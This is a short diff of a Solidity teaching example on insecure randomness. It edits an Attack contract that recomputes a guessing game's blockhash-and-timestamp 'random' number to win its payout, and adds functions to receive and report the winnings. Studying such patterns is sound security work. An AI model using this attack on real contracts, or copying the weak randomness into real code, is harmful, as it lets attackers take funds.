@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.29;
+pragma solidity 0.8.29;
 
 /*
  * Insecure sources of randomness:
@@ -38,11 +38,17 @@ contract GuessRandomNumber {
 }
 
 contract Attack {
+  receive() external payable {}
+
   function attack(GuessRandomNumber grn) public {
     // simple attack that consist in replicating the logic
     // But, this attack is also suceptible to front-running
     uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
 
     grn.guess(answer);
+  }
+
+  function getBalance() public view returns (uint) {
+    return address(this).balance;
   }
 }
